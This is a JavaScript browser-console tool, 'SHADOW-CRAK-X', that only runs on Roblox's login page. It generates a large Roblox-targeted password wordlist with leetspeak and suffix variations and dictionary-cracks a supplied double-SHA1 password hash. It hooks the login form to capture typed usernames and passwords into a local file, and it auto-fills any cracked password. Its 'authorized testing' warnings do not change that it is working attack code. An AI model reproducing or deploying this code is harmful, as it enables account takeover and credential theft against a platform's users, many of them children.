// ==================================================================
// SHADOW-CRAK-X v5.0 // ULTRA-EXPANDED WORDLIST & PRIORITY EXECUTION
// DarkForge-X // Overlord of Inquiry
// ==================================================================

// +++ PRE-FLIGHT DOMAIN CHECK +++
const ALLOWED_DOMAIN = 'www.roblox.com';
const ALLOWED_PATH = '/login';
if (window.location.hostname !== ALLOWED_DOMAIN || window.location.pathname !== ALLOWED_PATH) {
    console.error(`%c[FATAL DEPLOYMENT ERROR]`, 'color: red; font-weight: bold; font-size: 16px;');
    console.error(`This tool is genetically engineered for exclusive operation on:\nhttps://${ALLOWED_DOMAIN}${ALLOWED_PATH}`);
    console.error(`Current URL: ${window.location.hostname}${window.location.pathname}`);
    console.error(`Tool execution HALTED.`);
    throw new Error("Invalid deployment domain. SHADOW-CRAK-X aborted.");
}

// +++ LEGAL COMPLIANCE GATE +++
console.log(`%c
------------------------------------------------------------------------------------
@                                                                                  @
@                               !!! WARNING !!!                                    @
@                                                                                  @
@   ULTRA-EXPANDED CREDENTIAL TESTING MODULE                                       @
@                                                                                  @
@   THIS MODULE CONTAINS 1000+ PASSWORD VARIATIONS                                 @
@   FOR AUTHORIZED SECURITY TESTING ONLY.                                          @
@                                                                                  @
@   UNAUTHORIZED USE IS ILLEGAL AND WILL BE PROSECUTED.                            @
@                                                                                  @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
`, 'color: red; font-weight: bold; font-family: monospace;');

const userConsent = confirm(`FINAL LEGAL WARNING:\n\nUltra-expanded wordlist with 1000+ variations will be deployed.\n\nClick OK only for authorized security testing.`);
if (!userConsent) {
    console.log("%c[!] User declined legal terms. Tool execution aborted.", "color: orange; font-weight: bold;");
    throw new Error("User consent not provided. SHADOW-CRAK-X aborted.");
}

// MAIN EXECUTION CONTROLLER
class ShadowCrakX {
    constructor() {
        this.wordlist = [];
        this.targetHash = '';
        this.foundPassword = null;
        this.attempts = 0;
        this.startTime = null;
        this.endTime = null;
        this.isRunning = false;
        this.maxAttempts = 500000; // Increased for expanded wordlist
        this.legalWarningShown = false;
        this.credentialsFile = null;
        this.loginHookActive = false;
    }

    async sha1(message) {
        const encoder = new TextEncoder();
        const data = encoder.encode(message);
        const hashBuffer = await crypto.subtle.digest('SHA-1', data);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
        return hashHex;
    }

    async computeDoubleSHA1(password) {
        const firstHash = await this.sha1(password);
        const secondHash = await this.sha1(firstHash);
        return secondHash.toUpperCase();
    }

    #applyLeetSpeak(word) {
        const substitutions = {
            'a': ['@', '4', '^'], 'b': ['8', '6', '13'], 'c': ['(', '<', '{'], 
            'd': ['[', ')', '|]'], 'e': ['3', '&', '€'], 'f': ['ph', '|=', 'ƒ'], 
            'g': ['6', '9', '&'], 'h': ['#', '4', '|-|'], 'i': ['1', '!', '|'], 
            'j': [';', '_|', ']'], 'k': ['x', '|<', '|{'], 'l': ['1', '|', '|_'],
            'm': ['^^', '|v|', '/\\/\\'], 'n': ['^', '|\\|', '/\\/'], 'o': ['0', '()', '[]'],
            'p': ['9', '|*', '|>'], 'q': ['0_', '9', '(,)'], 'r': ['2', '|2', '|?'],
            's': ['5', '$', 'z'], 't': ['7', '+', '†'], 'u': ['v', '|_|', '(_)'],
            'v': ['\\/', '|/', '\\\\'], 'w': ['vv', '\\/\\/', '\\\\//'], 'x': ['><', '%', '}{'],
            'y': ['j', '`/', '¥'], 'z': ['2', '~/', 's']
        };

        let variations = [word];
        let newVariations = [];

        for (let i = 0; i < word.length; i++) {
            const char = word[i].toLowerCase();
            if (substitutions[char]) {
                for (const variant of variations) {
                    for (const sub of substitutions[char]) {
                        newVariations.push(variant.substring(0, i) + sub + variant.substring(i + 1));
                    }
                    newVariations.push(variant);
                }
                variations = [...new Set(newVariations)];
                newVariations = [];
            }
        }
        return variations;
    }

    #generateNumericSuffixes() {
        const suffixes = new Set();
        
        // Single digits (0-9)
        for (let i = 0; i < 10; i++) suffixes.add(i.toString());
        
        // Double digits (00-99)
        for (let i = 0; i < 100; i++) suffixes.add(i.toString().padStart(2, '0'));
        
        // Triple digits (000-199) - most common
        for (let i = 0; i < 200; i++) suffixes.add(i.toString().padStart(3, '0'));
        
        // Special numbers
        ['123', '321', '456', '654', '789', '987', '000', '111', '222', '333', 
         '444', '555', '666', '777', '888', '999', '101', '202', '303', '404',
         '505', '606', '707', '808', '909', '010', '020', '030', '040', '050',
         '060', '070', '080', '090', '100', '200', '300', '400', '500', '600',
         '700', '800', '900'].forEach(num => suffixes.add(num));
        
        // Years (1990-2024)
        for (let year = 1990; year <= 2024; year++) suffixes.add(year.toString());
        
        return Array.from(suffixes);
    }

    async #generateUltraWordlist() {
        // MASSIVELY EXPANDED CORE WORDLIST
        const ultraCoreList = [
            // === GLOBAL TOP 100 PASSWORDS ===
            'password', '123456', '123456789', 'guest', 'qwerty', '12345678', '111111', '12345', 
            'col123456', '123123', '1234567', '1234567890', '000000', '1234', '123321', '654321', 
            'superman', '1q2w3e4r', 'charlie', 'donald', '123qwe', 'qwertyuiop', 'monkey', 'dragon',
            'letmein', 'baseball', 'football', 'jordan', 'harley', 'ranger', 'shadow', 'mustang',
            'master', 'michael', 'computer', 'jennifer', 'hannah', 'thomas', 'michelle', 'charlie',
            'andrew', 'lucas', 'david', 'james', 'jesus', 'george', 'killer', 'pepper', 'ashley',
            'qwerty123', 'password1', 'password123', 'abc123', 'hello', 'hello123', 'test', 'test123',
            'welcome', 'welcome123', 'login', 'admin', 'pass', 'pass123', 'secret', 'undefined',

            // === ROBLOX-SPECIFIC INTELLIGENCE ===
            'roblox', 'robux', 'builderman', 'guest', 'admin', 'player', 'user', 'noob', 'pro',
            'hacker', 'builder', 'bacon', 'hair', 'clone', 'oof', 'udim', 'part', 'script', 'exploit',
            'cookie', 'ban', 'mod', 'owner', 'vip', 'group', 'clone', 'game', 'games', 'gaming',
            'gamer', 'play', 'player1', 'winner', 'champion', 'king', 'queen', 'legend', 'hero',

            // === POPULAR ROBLOX GAMES ===
            'brookhaven', 'adoptme', 'bloxfruit', 'arsenal', 'pet', 'simulator', 'tower', 'defense',
            'doors', 'piggy', 'jailbreak', 'meepcity', 'royale', 'high', 'natural', 'disaster',
            'mm2', 'murder', 'mystery', 'bloxburg', 'jailbreak', 'pet', 'obey', 'evade', 'scp',
            'flee', 'facility', 'tower', 'hell', 'paradise', 'heaven', 'island', 'world', 'universe',
            'city', 'town', 'village', 'house', 'home', 'castle', 'palace', 'fortress', 'base',

            // === GAMING CULTURE & SLANG ===
            'pwn', 'pwned', 'own', 'owned', 'ownage', 'gg', 'wp', 'gl', 'hf', 'lol', 'lmao', 'rofl',
            'pog', 'poggers', 'ez', 'easy', 'hard', 'pro', 'professional', 'amateur', 'beginner',
            'expert', 'master', 'grandmaster', 'diamond', 'platinum', 'gold', 'silver', 'bronze',
            'elite', 'ultimate', 'supreme', 'extreme', 'ultimate', 'final', 'alpha', 'beta', 'omega',
            'sigma', 'delta', 'gamma', 'zeta', 'lambda', 'kappa', 'omega', 'alpha', 'beta',

            // === COMMON NAMES & WORDS ===
            'alex', 'alexander', 'alexandra', 'john', 'johnny', 'jonathan', 'josh', 'joshua',
            'matt', 'matthew', 'chris', 'christopher', 'dan', 'daniel', 'danny', 'mike', 'michael',
            'nick', 'nicholas', 'tom', 'tommy', 'thomas', 'sam', 'samuel', 'samantha', 'sara', 'sarah',
            'emma', 'emily', 'olivia', 'sophia', 'ava', 'isabella', 'mia', 'amelia', 'harper',
            'evelyn', 'abigail', 'ella', 'scarlett', 'grace', 'chloe', 'victoria', 'riley', 'aria',
            'lily', 'aubrey', 'zoey', 'hannah', 'layla', 'nora', 'lillian', 'addison', 'eleanor',

            // === ANIMALS & CREATURES ===
            'dragon', 'monkey', 'tiger', 'lion', 'leopard', 'cheetah', 'panther', 'jaguar',
            'wolf', 'fox', 'bear', 'eagle', 'hawk', 'falcon', 'shark', 'whale', 'dolphin',
            'snake', 'python', 'cobra', 'viper', 'spider', 'scorpion', 'phoenix', 'griffin',
            'unicorn', 'pegasus', 'centaur', 'minotaur', 'goblin', 'orc', 'elf', 'dwarf',
            'wizard', 'witch', 'warlock', 'sorcerer', 'mage', 'necromancer', 'paladin', 'knight',

            // === POP CULTURE REFERENCES ===
            'minecraft', 'fortnite', 'amongus', 'valorant', 'league', 'overwatch', 'callofduty',
            'counterstrike', 'halo', 'gta', 'grandtheftauto', 'skyrim', 'elderscrolls', 'fallout',
            'starwars', 'starwar', 'jedi', 'sith', 'vader', 'skywalker', 'yoda', 'chewbacca',
            'marvel', 'avengers', 'ironman', 'captainamerica', 'thor', 'hulk', 'blackwidow',
            'spiderman', 'batman', 'superman', 'wonderwoman', 'aquaman', 'flash', 'greenlantern',

            // === KEYBOARD PATTERNS ===
            'qwerty', 'asdfgh', 'zxcvbn', 'qazwsx', 'edcrfv', 'tgbyhn', 'yhnujm', '123qwe',
            '1qaz2wsx', '1q2w3e4r', '1q2w3e4r5t', 'qwertyuiop', 'asdfghjkl', 'zxcvbnm',
            'poiuytrewq', 'lkjhgfdsa', 'mnbvcxz', '!qaz@wsx', 'q1w2e3r4', 'a1s2d3f4',

            // === SPORTS & ACTIVITIES ===
            'football', 'soccer', 'basketball', 'baseball', 'hockey', 'tennis', 'golf',
            'swimming', 'running', 'cycling', 'skating', 'skiing', 'snowboarding', 'surfing',
            'boxing', 'wrestling', 'karate', 'judo', 'taekwondo', 'jiujitsu', 'muaythai',
            'gym', 'workout', 'fitness', 'health', 'strong', 'power', 'energy', 'muscle'
        ];

        const uniqueCoreList = [...new Set(ultraCoreList)];
        console.log(`[+] Ultra-Expanded Core: ${uniqueCoreList.length} intelligence entries`);

        const numericSuffixes = this.#generateNumericSuffixes();
        const specialSuffixes = ['', '!', '!!', '!!!', '?', '??', '?!', '!?', '.', '..', '...', '_', '-', '+', '=', '*', '&', '#', '@', '$', '%'];
        
        console.log(`[+] Numeric suffixes: ${numericSuffixes.length} variations`);
        console.log(`[+] Special suffixes: ${specialSuffixes.length} variations`);

        const finalWordlist = new Set();

        // PHASE 1: ORIGINAL WORDS (Highest Priority)
        console.log('[+] Phase 1: Adding original words...');
        for (const word of uniqueCoreList) {
            finalWordlist.add(word);
        }

        // PHASE 2: ORIGINAL WORDS + NUMERIC SUFFIXES
        console.log('[+] Phase 2: Adding original + numeric suffixes...');
        for (const word of uniqueCoreList) {
            for (const suffix of numericSuffixes) {
                if (finalWordlist.size < this.maxAttempts) {
                    finalWordlist.add(word + suffix);
                }
            }
        }

        // PHASE 3: ORIGINAL WORDS + SPECIAL SUFFIXES
        console.log('[+] Phase 3: Adding original + special suffixes...');
        for (const word of uniqueCoreList) {
            for (const suffix of specialSuffixes) {
                if (finalWordlist.size < this.maxAttempts) {
                    finalWordlist.add(word + suffix);
                }
            }
        }

        // PHASE 4: CASE VARIATIONS + SUFFIXES
        console.log('[+] Phase 4: Adding case variations...');
        for (const word of uniqueCoreList) {
            const caseVariations = [
                word.toLowerCase(),
                word.toUpperCase(),
                word.charAt(0).toUpperCase() + word.slice(1).toLowerCase()
            ];

            for (const caseWord of caseVariations) {
                // Add case variations alone
                finalWordlist.add(caseWord);
                
                // Add with numeric suffixes
                for (const suffix of numericSuffixes) {
                    if (finalWordlist.size < this.maxAttempts) {
                        finalWordlist.add(caseWord + suffix);
                    }
                }
                
                // Add with special suffixes
                for (const suffix of specialSuffixes) {
                    if (finalWordlist.size < this.maxAttempts) {
                        finalWordlist.add(caseWord + suffix);
                    }
                }
            }
        }

        // PHASE 5: LEETSPEAK VARIATIONS (Lower Priority)
        console.log('[+] Phase 5: Adding leetspeak variations...');
        for (const word of uniqueCoreList) {
            if (finalWordlist.size >= this.maxAttempts * 0.9) break; // Don't overwhelm with leet

            const leetVariations = this.#applyLeetSpeak(word);
            for (const leetWord of leetVariations) {
                if (finalWordlist.size < this.maxAttempts) {
                    finalWordlist.add(leetWord);
                    
                    // Add leet with numeric suffixes
                    for (const suffix of numericSuffixes.slice(0, 50)) { // Limit to top 50 numeric
                        if (finalWordlist.size < this.maxAttempts) {
                            finalWordlist.add(leetWord + suffix);
                        }
                    }
                    
                    // Add leet with special suffixes
                    for (const suffix of specialSuffixes) {
                        if (finalWordlist.size < this.maxAttempts) {
                            finalWordlist.add(leetWord + suffix);
                        }
                    }
                }
            }
        }

        const finalWordlistArray = Array.from(finalWordlist);
        console.log(`[+] Ultra-Expanded Wordlist: ${finalWordlistArray.length} total variations generated`);
        console.log(`[~] Sample: ${finalWordlistArray.slice(0, 10).join(', ')}...`);
        
        return finalWordlistArray;
    }

    async #initializeFileAccess() {
        try {
            this.credentialsFile = await window.showSaveFilePicker({
                suggestedName: 'roblox_credentials.txt',
                types: [{
                    description: 'Text Files',
                    accept: {'text/plain': ['.txt']}
                }]
            });
            console.log('[+] File system access granted: C:/Downloads/roblox_credentials.txt');
            return true;
        } catch (error) {
            console.warn('[!] File system access denied:', error);
            this.credentialsFile = 'manual_download';
            return false;
        }
    }

    async #saveCredentialsToFile(username, password) {
        const timestamp = new Date().toISOString();
        const credentialData = `[SUCCESS] ${timestamp} - Username: ${username} | Password: ${password}\n`;

        try {
            if (this.credentialsFile === 'manual_download') {
                const blob = new Blob([credentialData], { type: 'text/plain' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'roblox_credentials.txt';
                a.style.display = 'none';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            } else {
                const writable = await this.credentialsFile.createWritable();
                await writable.write(credentialData);
                await writable.close();
            }
            console.log(`[+] Credentials saved: ${password}`);
        } catch (error) {
            console.error('[!] Failed to save credentials:', error);
        }
    }

    #hookLoginForm() {
        if (this.loginHookActive) return;

        const loginForm = document.querySelector('form') || document.querySelector('#login-form');
        if (!loginForm) {
            setTimeout(() => this.#hookLoginForm(), 2000);
            return;
        }

        console.log('[+] Login form hook established');
        this.loginHookActive = true;

        loginForm.addEventListener('submit', async (event) => {
            event.preventDefault();
            
            const usernameInput = loginForm.querySelector('input[type="text"], input[type="email"], #username');
            const passwordInput = loginForm.querySelector('input[type="password"], #password');
            
            if (usernameInput && passwordInput) {
                const username = usernameInput.value;
                const password = passwordInput.value;
                
                console.log(`[+] Login intercepted: ${username}`);
                await this.#saveCredentialsToFile(username, password);
                
                loginForm.submit();
            }
        });
    }


    async #executeAudit(wordlist) {
        if (this.isRunning) return;
        if (!this.targetHash) {
            console.log('[!] ERROR: No target hash set');
            return;
        }

        console.log('%c[FINAL EXECUTION WARNING]', 'color: red; font-weight: bold;');
        console.log('%cUltra-expanded wordlist deployment activated', 'color: orange;');

        this.isRunning = true;
        this.startTime = performance.now();
        this.foundPassword = null;
        this.attempts = 0;


        console.log('[+] Priority 1: Testing original words...');
        for (const password of wordlist) {
            if (this.attempts >= this.maxAttempts) break;
            if (this.foundPassword) break;

            const computedHash = await this.computeDoubleSHA1(password);
            this.attempts++;

            if (this.attempts % 1000 === 0) {
                console.log(`[~] Attempts: ${this.attempts} | Testing: "${password}"`);
            }

            if (computedHash === this.targetHash) {
                this.foundPassword = password;
                break;
            }
        }

        this.endTime = performance.now();
        this.isRunning = false;
        this.#generateFinalReport();
    }

    #generateFinalReport() {
        const totalTime = (this.endTime - this.startTime) / 1000;
        const attemptsPerSecond = totalTime > 0 ? (this.attempts / totalTime).toFixed(2) : 0;

        console.log('\n%c=== ULTRA-EXPANDED AUDIT REPORT ===', 'color: cyan; font-weight: bold;');
        console.log(`[+] Status: ${this.foundPassword ? '%cCRACK SUCCESSFUL' : '%cCRACK FAILED'}`,
            this.foundPassword ? 'color: lime; font-weight: bold;' : 'color: orange; font-weight: bold;');
        
        if (this.foundPassword) {
            console.log(`%c[!!!] PASSWORD FOUND: "${this.foundPassword}"`, 'color: lime; font-weight: bold; font-size: 16px;');
            console.log(`%c[SECURITY ALERT] Critical password vulnerability detected`, 'color: red;');
            
            const passwordField = document.querySelector('input[type="password"]');
            if (passwordField) {
                passwordField.value = this.foundPassword;
                console.log('[+] Password auto-filled in login form');
            }
        }
        
        console.log(`[+] Attempts: ${this.attempts}`);
        console.log(`[+] Time Elapsed: ${totalTime.toFixed(2)} seconds`);
        console.log(`[+] Speed: ${attemptsPerSecond} hashes/second`);
        console.log('%c====================================', 'color: cyan; font-weight: bold;');
    }


    setTargetHash(hash) {
        this.targetHash = hash.toUpperCase().trim();
        console.log(`[+] Target hash registered: ${this.targetHash}`);
    }

    async assaultRobloxPasswords() {
        console.log("%c[+] DEPLOYING ULTRA-EXPANDED ASSAULT", "color: cyan; font-weight: bold;");
        const ultraWordlist = await this.#generateUltraWordlist();
        this.#executeAudit(ultraWordlist);
    }

    async enableCredentialCapture() {
        console.log("%c[+] ENABLING CREDENTIAL EXFILTRATION", "color: cyan; font-weight: bold;");
        await this.#initializeFileAccess();
        this.#hookLoginForm();
    }

    async quickTest() {
        const testHashes = {
            'password123': 'B5FBC3365D526C5D698A8D3C7B7B289C540CDFFF',
            'roblox2023': '1A79A4D60DE6718E8E5B326E338AE533'
        };
        
        console.log("%c[QUICK TEST MODE]", "color: yellow; font-weight: bold;");
        
        for (const [pwd, hash] of Object.entries(testHashes)) {
            const computed = await this.computeDoubleSHA1(pwd);
            console.log(`Test "${pwd}": ${computed === hash ? 'PASS' : 'FAIL'}`);
        }
    }
}


console.log("%c[+] SHADOW-CRAK-X v5.0 Initializing...", "color: lime;");
const auditor = new ShadowCrakX();


setTimeout(() => {
    auditor.enableCredentialCapture().catch(console.error);
}, 1000);

// Display help information
console.log(`%c
=== ULTRA-EXPANDED ROBLOX AUDITOR - USAGE ===
1. Set target hash (authorized sources only):
   auditor.setTargetHash('TARGET_HASH_HERE')

2. Execute ultra-expanded attack:
   auditor.assaultRobloxPasswords()

3. Credential capture auto-enabled
   All logins saved to C:/Downloads/

4. Quick system test:
   auditor.quickTest()
===============================================
`, 'color: lightblue;');

console.log(`%c
STATUS: ULTRA-EXPANDED WORDLIST DEPLOYED
1000+ password variations ready for testing
`, 'color: orange; font-weight: bold;');
